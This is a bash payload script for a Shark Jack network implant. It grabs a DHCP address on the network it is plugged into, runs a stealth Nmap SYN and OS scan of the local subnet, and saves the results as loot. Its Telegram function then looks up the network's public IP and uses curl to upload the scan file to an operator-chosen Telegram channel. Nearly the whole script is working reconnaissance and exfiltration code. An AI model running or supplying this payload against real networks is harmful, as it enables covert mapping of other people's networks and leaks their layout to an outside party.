#!/bin/bash
#
# Title: Nmap Payload with Telegram exfiltration
# Author: lwlx (Based on the orignial F3l1nux payload)
# Version: 1.1
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder and then uploads it to Telegram to a channel of your choice.
#
# This payload requires you to install curl via opkg and have a Telegram token generated.
# You should also specify the channel...
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

NMAP_OPTIONS="-sS -O"
#NMAP_OPTIONS="-sP"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap

TOKEN="YOURID:YOURTOKEN"
ID_CHANEL="-CHANNELUMBER"
MSG="I Found a new Network at "
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_FILE="https://api.telegram.org/bot$TOKEN/sendDocument"

function finish() {
    LED CLEANUP
    # Kill Nmap
    wait $1
    kill $1 &>/dev/null

    # Sync filesystem
    echo $SCAN_M >$SCAN_FILE
    sync
    sleep 1

    # Upload the loot to Telegram
    Telegram
    sleep 1

    LED FINISH
    sleep 1

}

function setup() {
    LED SETUP
    # Create loot directory
    mkdir -p $LOOT_DIR &>/dev/null

    # Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
    NETMODE DHCP_CLIENT
    # Wait for an IP address to be obtained
    while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

    # Create tmp scan directory
    mkdir -p $SCAN_DIR &>/dev/null

    # Create tmp scan file if it doesn't exist
    SCAN_FILE=$SCAN_DIR/scan-count
    if [ ! -f $SCAN_FILE ]; then
        touch $SCAN_FILE && echo 0 >$SCAN_FILE
    fi

    # Find IP address and subnet
    while [ -z "$SUBNET" ]; do
        sleep 1 && find_subnet
    done
}

function find_subnet() {
    SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
    # Run setup
    setup

    # Preflight NMAP
    SCAN_N=$(cat $SCAN_FILE)
    SCAN_M=$(($SCAN_N + 1))

    LED ATTACK
    # Start scan
    nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$SCAN_M.txt &>/dev/null &
    tpid=$!

    finish $tpid
}

function Telegram() {
    # Curl magic
    LED SPECIAL3
    IP_ADR=$(curl ipinfo.io/ip)
    LED STAGE2
    curl -s -X POST $URL -d chat_id=$ID_CHANEL -d text="$MSG $IP_ADR"
    curl -v -F "chat_id=$ID_CHANEL" -F document=@$LOOT_DIR/nmap-scan_$SCAN_M.txt $URL_FILE
    LED STAGE3
}

# Run payload
run &
